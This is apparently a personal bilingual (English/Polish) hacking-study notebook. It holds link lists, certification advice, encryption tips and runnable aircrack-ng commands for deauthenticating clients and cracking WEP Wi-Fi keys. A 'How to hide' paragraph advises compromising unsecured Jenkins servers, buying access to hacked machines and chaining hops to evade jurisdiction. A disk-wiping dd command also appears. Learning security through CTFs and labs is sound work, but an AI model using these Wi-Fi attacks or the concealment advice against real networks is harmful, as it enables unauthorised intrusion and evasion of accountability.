---
sidebar_position: 1
---

# General

## Pages

- tryhackme.com
- hackthis.co.uk
- microcorruption.com
- vulnhub.com
- perntesterlabs.com
- hackthebox.com
- [CTF 101](https://ctf101.org/)
- [Web Hacking 101 by Peter Yaworski [Leanpub PDF/iPad/Kindle]](https://leanpub.com/web-hacking-101)
Shodan
Zoomeye
Crt.sh
Virustotal
Insecama
Program burp
Hakowanie apek frida

## Room Steps:

- [x] OpenVPN
- [ ] RP: Nmap
- [ ] RP: Metasploit
- [ ] Blue
- [ ] Ice

## Wifi Hacking 101

> Learn to attack WPA(2) networks! Ideally you'll want a smartphone with you for this, preferably one that supports hosting wifi hotspots so you can follow along.

# Hacking - Learn

# Metasploit

## Links

#### Metasploit freamwork

[rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

#### Metasploitable3 is a VM that is built from the ground up with a large amount of security vulnerabilities

[rapid7/metasploitable3](https://github.com/rapid7/metasploitable3)

## Usefull programming languages

- A tak serio już to proponuję Ruby. Metasploit jest napisany w Rubym. Fajna składnia, zbliżona do pythona. Duże możliwości rozszerzania za pomocą GEMs.
- zależy od dziedziny ja w WEB używam non stop JavaScript i SQL, często używam PHP i bash/batch. jak atakujesz liuxy i unixy to python, ruby i/lub bash
- bash
- powershell
- python

# Types of malicious software

[What Is the Difference: Viruses, Worms, Trojans, and Bots?](https://tools.cisco.com/security/center/resources/virus_differences#:~:text=A%20Trojan%20is%20another%20type,Greeks%20used%20to%20infiltrate%20Troy.&text=Trojans%20are%20also%20known%20to,nor%20do%20they%20self%2Dreplicate.)

- Malware
  - Ransomware

- Viruses

- Worms

- Trojans

- Bots

# Tips

## VirtualBox

### What to select for paravirtualization interface

[Chapter�10.�Technical Background](https://www.virtualbox.org/manual/ch10.html#gimproviders)

Minimal: Announces the presence of a virtualized environment. Additionally, reports the TSC and APIC frequency to the guest operating system. This provider is mandatory for running any Mac OS X guests.

KVM: Presents a Linux KVM hypervisor interface which is recognized by Linux kernels version 2.6.25 or later. Oracle VM VirtualBox's implementation currently supports paravirtualized clocks and SMP spinlocks. This provider is recommended for Linux guests.

Hyper-V: Presents a Microsoft Hyper-V hypervisor interface which is recognized by Windows 7 and newer operating systems. Oracle VM VirtualBox's implementation currently supports paravirtualized clocks, APIC frequency reporting, guest debugging, guest crash reporting and relaxed timer checks. This provider is recommended for Windows guests.

### How to fix a problem with performance

1. Uncheck 'Enable 3D Acceleration' in: ```Settings > Display > Screen > Acceleration```
2. Increase video memory of virtual machine:

```
# VBoxManage modifyvm "Kali Rolling (2019.4) x64" --vram 256
```

## Attacks types

- Denial-of-service (DoS) and distributed denial-of-service (DDoS) attacks.
- Man-in-the-middle (MitM) attack.
- Phishing and spear phishing attacks.
- Drive-by attack.
- Password attack.
- SQL injection attack.
- Cross-site scripting (XSS) attack.
- Eavesdropping attack.
- email spoofing
- OWASP Web Security Testing Guide
- CVE Details [Top 50 products having highest number of cve security vulnerabilities](https://www.cvedetails.com/top-50-products.php?fbclid=IwAR23o2sIu-AiTYVvj5K0s3NkwexQD5Cbvt3EnLS_1Fraha2dEeaaWjGXoUY)
- Build Your Own Botnet [GitHub - malwaredllc/byob: BYOB (Build Your Own Botnet)](https://github.com/malwaredllc/byob?fbclid=IwAR3d5_qgyatKd3kkLTuzocS1gw4hFgc98cDS2wy4emS4Rmr03-CeZBtTPUo)

John Hammond - youtube hacking

## TODO

[How to Hack Wi-Fi & Networks More Easily with Lazy Script « Null Byte :: WonderHowTo](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-more-easily-with-lazy-script-0185764/)
[How to Hack Wi-Fi & Networks More Easily with Lazy Script « Null Byte :: WonderHowTo](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-more-easily-with-lazy-script-0185764/)
<https://tryhackme.com>
[GitHub - ethicalhack3r/DVWA: Damn Vulnerable Web Application (DVWA)](https://github.com/ethicalhack3r/DVWA)
[](https://owasp.org/www-pdf-archive/OWASP_Application_Security_Verification_Standard_4.0-en.pdf)
[Pentester Land · Offensive Infosec](https://pentester.land/)
[The unofficial HackerOne disclosure Timeline](http://h1.nobbd.de/)

<!-- ![mapa-mysli2.png](:storage/ddb4d038-991d-4cae-901f-73b579d6e5f4/45d5619e.png) -->

## The best and usefull

[Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers](https://www.exploit-db.com/)

## GitHub

[GitHub - derv82/wifite2: Rewrite of the popular wireless network auditor, "wifite"](https://github.com/derv82/wifite2)
[GitHub - qazbnm456/awesome-web-security: 🐶 A curated list of Web Security materials and resources.](https://github.com/qazbnm456/awesome-web-security)
[GitHub - k4m4/movies-for-hackers: 🎬 A curated list of movies every hacker & cyberpunk must watch.](https://github.com/k4m4/movies-for-hackers)
[HackTricks - HackTricks](https://book.hacktricks.xyz/)

[GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
[GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings)
[GitHub - joe-shenouda/awesome-cyber-skills: A curated list of hacking environments where you can train your cyber skills legally and safely](https://github.com/joe-shenouda/awesome-cyber-skills)

## Collection of links

[GitHub - vitalysim/Awesome-Hacking-Resources: A collection of hacking / penetration testing resources to make you better!](https://github.com/vitalysim/Awesome-Hacking-Resources)
[GitHub - trimstray/the-book-of-secret-knowledge: A collection of inspiring lists, manuals, cheatsheets, blogs, hacks, one-liners, cli/web tools and more.](https://github.com/trimstray/the-book-of-secret-knowledge)
[GitHub - wtsxDev/reverse-engineering: List of awesome reverse engineering resources](https://github.com/wtsxDev/reverse-engineering)

# Network Hacking

## Content

1. Pre-connection Attacks
2. Gaining Access
3. Pros-connection Attacks - ataki pozwalające na przechwytywanie pakietów danych, dostępne dopiero kiedy uzyskamy dostęp do sieci

## Links

[iw command](https://www.cellstream.com/reference-reading/tipsandtricks/410-3-ways-to-put-your-wi-fi-interface-in-monitor-mode-in-linux)

## Pre-connection Attacks

#### List all network devices (interfaces)

```bash
ip link show
# or
ifconfig

iw dev
# or
iwconfig
```

#### Turn on/off network device

```bash
sudo ip link set dev <your device> down
# ifconfig <your device here> down

sudo ip link set dev <your device> up
# ifconfig wlan0 up
```

#### Change MAC Address

```bash
$ sudo ip link set dev <your device> address <your new mac address>

ip link set dev wlan0 address FA:EF:0E:44:FE:68
$ # ifconfig <your device here> hw ether 00:11:22:33:44:55
# 6c:62:6d:c8:e4:d9
```

#### Set monitor mode

```bash
sudo ip link set dev <your device> down

sudo airmon-ng check kill

sudo iw <your device> set monitor none
# sudo iwconfig <your device> mode monitor
```

#### Set monitor mode (using airmon-ng)

```bash
airmon-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```

#### Set managed mode

```bash
sudo iw <your device> set type managed
# sudo iwconfig wlan0 mode managed
```

#### Run monitor scan

```bash
airodump-ng <your device>
airodump-ng --band a wlan0 # Sniff 5GHz networks
airodump-ng --band abg wlan0 # Sniff 2.4 and 5GHz networks
```

#### Disconnect specific device from the network

```bash
aireplay-ng --deauth 10000000 -a <mac addr router> -c <mac addr hacked device> <your device>
```

#### Run monitor mode for specific network and save packets to file

```bash
airodump-ng --bssid <mac addr router> --channel <number of router channel> --write <name of saved file> <your device>
```

## Gaining Access

There are 3 most popular types of encryptions:

1. WEP
2. WPA
3. WPA2

### ad. 1 - WEP

Encryption is old, uses RC4 algorithm, can be cracked easly. WEP stands for Wired Equivalent Privacy. There are two kinds of WEP with keys of either 64bits or 128bits. The longer key gives a slightly higher level of security (but not as much as the larger number would imply). In fact the user keys are 40bits and 104bits long, the other 24bits in each case being taken up by a variable called the Initialization Vector (IV).

This is how it would work:

1. You intercept a packet
2. You look at the IV coming with this packet in clear
3. You check in your dictionary to see if you have the corresponding Keystream for this IV
4. If yes, you use the keystream to decrypt the message. If not, you keep the IV and wait for another encrypted packet with the same IV, which would allow to get Keystream for this IV (by XORing the two packets) and add it to your dictionary

#### If network is busy

We can caputer packages from clients connected to this network and find a password based on captured packages.

Listen our target network:

```bash
airodump-ng --bssid 74:EA:3A:DD:E8:3C --channel 6 --write netia wlan0
```

In the same time we can run aircrack which is trying calc password based on our stored file:

```bash
aircrack-ng netia-01.cap
```

Full attack:

```bash
ip link set dev wlan0 address 12:F5:C4:11:14:70
airodump-ng --bssid 88:F7:C7:44:B3:44 --channel 1 -w final02 -a wlan0
aireplay-ng -3 -b 88:F7:C7:44:B3:44 -h 12:F5:C4:11:14:70 -x 50 wlan0
aireplay-ng -1 0 -e Tech_D0062129 -a 88:F7:C7:44:B3:44 -h 12:F5:C4:11:14:70 wlan0
# aireplay-ng --fakeauth 0 -a 88:F7:C7:44:B3:44 -h 12:F5:C4:11:14:70 wlan0
```

#### If network is not busy

We can force on network network sending packages with IV to have enough data to crack the key.

Start injecting packets into the traffic to force AC to generate new packets with new IVs. It will increase number of data and allow to crack passwords.

```bash
aireplay-ng --arpreplay -b <mac addr router> -h <mac addr adapter> <your device>
```

### ad. 2 - WPA

### ad. 3 - WPA2

## Pros-connection Attacks

## Words

<b>1. MAC Address (Media Access Control)</b>

- permanent
- physical
- unique on the world
- assigned by manufacturer

## Problems

<b>1. `bash: ifconfig: command not found`</b>

`ifconfig` is outdated and now replaced with `ip a`

```bash
$ # ifconfig
$ ip addr show
$ ip link show

$ # ifconfig eth0 down
$ ip link set eth0 down
clera
$ # ifconfig eth0 up
$ ip link set eth0 up
```

[ifconfig-command-not-found](https://unix.stackexchange.com/questions/145447/ifconfig-command-not-found
)
[should-i-quit-using-ifconfig](https://serverfault.com/questions/458628/should-i-quit-using-ifconfig)

## Articles

[The Best Ethical Hacking Tools in 2020](https://www.ceos3c.com/security/best-ethical-hacking-tools/)

[Getting started in Cyber Security in 2021](https://www.ceos3c.com/security/getting-started-cyber-security-complete-guide/#1-basic-computer-skills)

[https://owasp.org/Top10/](https://owasp.org/Top10/)

[https://kalilinuxtutorials.com/hackingtool/](https://kalilinuxtutorials.com/hackingtool/)

## Hack The Box

[Hack the box](https://www.hackthebox.eu)

[HTB Videos](https://www.youtube.com/c/ippsec/videos)

OvertheWire.Gona try VulnH

https://overthewire.org/

https://www.vulnhub.com/

https://www.hackerone.com/

https://www.hacker101.com/

https://ctftime.org/ctf-wtf/

https://ctf101.org/

## Certificates

- CEH
- CISSP
- OSCP
- OSINT (Open-source intelligence)
- CISSP, CCSK, CISA, OSCP, SECURITY+, CSSLP
- PenTest+
e
AWS:
1. Cloud Practioner (only if you are not familiar with cloud services)
2. Solution Architect (The most important)
3. Solution Architect Professional or maybe better Security
<!-- ![Screen Shot 2021-01-25 at 16.14.50.png](:storage/306c3392-eb36-4a13-a53f-fbc2ef749a41/9293accf.png) -->

Before CEH certification you should be advanced knowledge about security.
For do that you should pass other certificates like:
[ ] 1 CompTIA A+ (scripting languages, bash, python, powershell)
[TOTAL: CompTIA A+ Certification (220-1001). \| Udemy](https://www.udemy.com/course/new-comptia-a-2019-certification-1001-the-total-course/)
[ ] 2 CompTIA Network+
[ ] 3 CompTIA Security+
[ ] 4 Something about fundamental cloud (Microsoft or AWS)
[ ] 5 Cisco CCNA
[ ] 6 CEH
[ ] 7 AWS Solution Architect Associate

JOBS

Certification	LinkedIn	Indeed	Simply Hired	Total
CISSP	48,711	13,499	9,333	71,543
CISA	12,466	6,138	3,859	22,463
CISM	8,860	4,064	2,806	15,730
Security+	5,371	3,583	2,698	11,652
CEH	5,894	2,401	1,697	9,992
GSEC	3,633	2,515	1,897	8,045
SSCP	3,682	2,442	1,859	7,983
CASP	2,918	2,052	1,500	6,470
GCIH	2,872	1,902	1,279	6,053
OSCP	2,798	1,948	949	5,695


You should have solid knowledge about: OWASP.

[CompTIA Security+ (SY0-601) (In Production)](https://www.itpro.tv/courses/security-skills/security-sy0601/)
[RED TEAM Operator: Malware Development Essentials Course](https://institute.sektor7.net/red-team-operator-malware-development-essentials?coupon=MALDEV-45FCB2WESI4)
[Certified Red Team Operator (CRTO) Course Review](https://v3ded.github.io/misc/certified-red-team-operator-crto-review#--hardware)
[Home - This is IT](https://thisisit.io/)
[Web Hacking 101 by Peter Yaworski [Leanpub PDF/iPad/Kindle]](https://leanpub.com/web-hacking-101)
[Twitch](https://www.twitch.tv/videos/876399678)

Automotive Hacking
Ransomeware
Netowrk Chunk
Bug Bounty

https://owasp.org/Top10/

Konferencja hakerska DEF CON:
https://www.youtube.com/watch?v=daLhn8lIbGo&t=638s

https://github.com/P0cL4bs/wifipumpkin3

## CTF Challanges

[CTFtime.org / All about CTF (Capture The Flag)](https://ctftime.org/)
[CTFtime.org / PlaidCTF 2020 / sidhe](https://ctftime.org/task/11315)
[CTFtime.org / Writeups](https://ctftime.org/writeups)
[Challenges - CTFlearn - CTF Practice - CTF Problems / Challenges](https://ctflearn.com/challenge/1/browse)
[YouTube](https://www.youtube.com/user/GynvaelColdwind/videos)
["coldwind" - Wyniki wyszukiwania - Wydawnictwo Helion, księgarnia helion.pl](https://helion.pl/search?szukaj=coldwind)
[YouTube](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
[Google CTF](https://capturetheflag.withgoogle.com/)
[YouTube](https://www.youtube.com/user/RootOfTheNull)
[TryHackMe \| Hacking Training](https://tryhackme.com/)

1. Forensics
2. Cryptography
3. Web Exploitation
4. Reverse Engineering
[GitHub - wtsxDev/reverse-engineering: List of awesome reverse engineering resources](https://github.com/wtsxDev/reverse-engineering)
6. Binary Exploitation
7. Networking
[GitHub - snoopysecurity/awesome-burp-extensions: A curated list of amazingly awesome Burp Extensions](https://github.com/snoopysecurity/awesome-burp-extensions)
[GitHub - derv82/wifite2: Rewrite of the popular wireless network auditor, "wifite"](https://github.com/derv82/wifite2)
9. Scripting
10. OSINT

Web Exploitation
Forensics
OSINT
Scripting
Networking
Reverse Engineering


## How to hide - Metody ukrywania się w sieci

1. TAILS Linux
2. Proxychains
3. [https://github.com/J0113/ProxyHuntr](https://github.com/J0113/ProxyHuntr)
4. VPN + socks5 proxy to Remote Desktop
5. [https://www.amazon.com/Art-Invisibility-Worlds-Teaches-Brother/dp/0316380504/ref=nodl_](https://www.amazon.com/Art-Invisibility-Worlds-Teaches-Brother/dp/0316380504/ref=nodl_)

Firstly, depending on where you reside, burner devices or the ability to shread your memory is key. Compromising staging/dev environments are the easiest (i.e. unsecured Jenkins instance) where you can have a script that might automatically buy bulletproof hosting/proxy. If not that, buying access to an already compromised machine is dirt cheap but that comes with presumed baggage. From there, you can build out across however many 'jumps' you want until you feel far enough removed jurisdictionallly from where you executed.

## Encryption devices

If you use native encryption tool, you will only be able to decrypt and access files on the same operating system. If you want to make your data available on any OS, you’ll need to partition your USB, make copies of your files, and make each partition encrypted in a format compatible with a specific OS.

### Methods

VeraCrypt

Bitlocker

Luks Nuke

Szyfrowanie od sandisk nie jest polecane, lepiej jest wybrać jakiś sprawdzony sposób.

### Lista pendrive posiadających szyfrowanie

Yubico YubiKey 5 NFC - urządzenie usb autoryzujące osobę

Kingston DT2000 - posiada fizyczną klawiaturę

Kingston IronKey Basic S1000 - 256-bit szyfrowanie sprzętowe AES w trybie XTS

Dysk sieciowy, np. QNAP TS-251 nie warto kupować z procesorem ARM bo nie wydala przy docker, WD mają strasznie okrojone oprogramowanie, QNAP to taki linux a Synology to MAC OS - ludzie bardzo polecają konfigurację Synology. Warto chyba jednak wybrać QNAP, bo za tę samą cenę jest mocniejsza wersja.

[https://www.morele.net/serwer-plikow-qnap-ts-251d-4g-6544270/](https://www.morele.net/serwer-plikow-qnap-ts-251d-4g-6544270/)

[https://www.mediaexpert.pl/komputery-i-tablety/dyski-i-pamieci/dyski-sieciowe/serwer-plikow-qnap-ts-251-2g](https://www.mediaexpert.pl/komputery-i-tablety/dyski-i-pamieci/dyski-sieciowe/serwer-plikow-qnap-ts-251-2g)

### Bezpieczeństwo

Virtual box is a good product if you've never worked with virtual machines. You could throw a copy of windows pro on it and run through the 30 day trial. Just make sure it doesn't have a network connection while you're installing it then you should be able to get around having to give it an email during setup.

Keep an eye on stuff until they get you a laptop and scrub every trace of their software from your PC when it's done. If it really came to it I would have done a VM from the start and then deleted it when I got the laptop. That way it provides at least some layer of segregation between work and personal.

### Mac OS partitions formats

- **APFS** refers to Apple File System, which is a proprietary file system used by Mac devices running macOS 10.13 or later. APFS is a better choice for solid state and flash drives.
- **Mac OS Extended** is a journaling file system used by macOS 10.12 or earlier. Mac OS Extended is a better for mechanical drives, or drives used on older macOS.

**VeraCrypt** is a fully audited and [open source](https://sourceforge.net/projects/veracrypt/) fork of TrueCrypt that ‘solves many vulnerabilities and security issues found in TrueCrypt. Last version is from one year ago.

### External libraries

**Cryptsetup -** LUKS

[https://gitlab.com/cryptsetup/cryptsetup](https://gitlab.com/cryptsetup/cryptsetup)

[https://gitlab.com/cryptsetup/cryptsetup](https://gitlab.com/cryptsetup/cryptsetup)

[https://www.tutorialspoint.com/unix_commands/cryptsetup.htm](https://www.tutorialspoint.com/unix_commands/cryptsetup.htm)

### How to encrypt external device

[https://nordvpn.com/blog/how-to-encrypt-flash-drive/](https://nordvpn.com/blog/how-to-encrypt-flash-drive/)

Use native Mac OS encryption.

[https://rietta.com/blog/encrypted-drive-and-docker/](https://rietta.com/blog/encrypted-drive-and-docker/)

### **I was able to get the APFS and GUID scheme option by deleting the MBR**

1. Open a Terminal
2. Find out which disk is your target: `diskutil list`
3. Unmount the disk: `diskutil umountDisk /dev/disk#` with `#` being the number of the drive you determined in step 1 (e.g. `/dev/disk2`)
4. Delete the MBR: `dd if=/dev/zero of=/dev/disk# bs=512 count=1`
5. If you open DiskUtil now you will be offered APFS
